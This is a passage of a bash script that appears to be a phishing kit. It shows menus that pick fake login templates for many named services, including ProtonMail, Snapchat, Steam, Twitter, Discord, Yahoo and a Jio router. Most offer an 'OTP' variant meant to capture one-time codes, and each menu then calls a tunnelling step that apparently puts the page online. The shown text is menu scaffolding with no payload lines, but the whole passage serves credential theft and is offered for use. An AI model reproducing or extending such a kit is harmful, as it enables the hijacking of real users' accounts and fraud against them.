echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="protonmail"
                tunnelmenu;;
        2 | 02)
                website="protonmail/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_protonmail; };;
esac
}
#reddit
site_reddit(){
echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="reddit"
                tunnelmenu;;
        2 | 02)
                website="reddit_old"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_reddit; };;
esac
}
#shopify
site_shopify(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="shopify"
                tunnelmenu;;
        2 | 02)
                website="shopify/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_shopify; };;
esac
}
#snapchat
site_snapchat(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="snapchat"
                tunnelmenu;;
        2 | 02)
                website="snapchat/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_snapchat; };;
esac
}
#socialclub
site_socialclub(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="socialclub"
                tunnelmenu;;
        2 | 02)
                website="socialclub/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_socialclub; };;
esac
}
#spotify
site_spotify(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="spotify"
                tunnelmenu;;
        2 | 02)
                website="spotify/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_spotify; };;
esac
}
#stackoverflow
site_stackoverflow(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="stackoverflow"
                tunnelmenu;;
        2 | 02)
                website="stackoverflow/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_stackoverflow; };;
esac
}
#steam
site_steam(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="steam"
                tunnelmenu;;
        2 | 02)
                website="steam/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_steam; };;
esac
}
#tiktok
site_tiktok(){
echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="tiktok"
                tunnelmenu;;
        2 | 02)
                website="tiktok_likes"
                tunnelmenu;;
        3 | 03)
                website="tiktok_likes/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_tiktok; };;
esac
}
#twitch
site_twitch(){
echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="twitch"
                tunnelmenu;;
        2 | 02)
                website="twitch/otp"
                tunnelmenu;;
        3 | 03)
                website="twitch_new"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_twitch; };;
esac
}
#twitter
site_twitter(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="twitter"
                tunnelmenu;;
        2 | 02)
                website="twitter/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_twitter; };;
esac
}
#ubereats
site_ubereats(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="ubereats"
                tunnelmenu;;
        2 | 02)
                website="ubereats/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_ubereats; };;
esac
}
#verizon
site_verizon(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="verizon"
                tunnelmenu;;
        2 | 02)
                website="verizon/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_verizon; };;
esac
}
#vk
site_vk(){
echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="vk"
                tunnelmenu;;
        2 | 02)
                website="vk/otp"
                tunnelmenu;;
        3 | 03)
                website="vk_poll"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_vk; };;
esac
}

#wordpress
site_wordpress(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="wordpress"
                tunnelmenu;;
        2 | 02)
                website="wordpress/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_wordpress; };;
esac
}
#xbox
site_xbox(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="xbox"
                tunnelmenu;;
        2 | 02)
                website="xbox/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_xbox; };;
esac
}
#yahoo
site_yahoo(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="yahoo"
                tunnelmenu;;
        2 | 02)
                website="yahoo/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_yahoo; };;
esac
}
#yandex
site_yandex(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="yandex"
                tunnelmenu;;
        2 | 02)
                website="yandex/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_yandex; };;
esac
}
#ytsubs
site_ytsubs(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="ytsubs"
                tunnelmenu;;
        2 | 02)
                website="ytsubs/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_ytsubs; };;
esac
}

#discord
site_discord(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="discord"
                tunnelmenu;;
        2 | 02)
                website="discord/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_discord; };;
esac
}
#jiorouter
site_jiorouter(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="jiorouter"
                tunnelmenu;;
        2 | 02)
                website="jiorouter/otp"
                tunnelmenu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_jiorouter; };;
esac
}


##MAIN
clear
cbanner
directories
kill_pid
dependencies
xpermission
clear
mainmenu
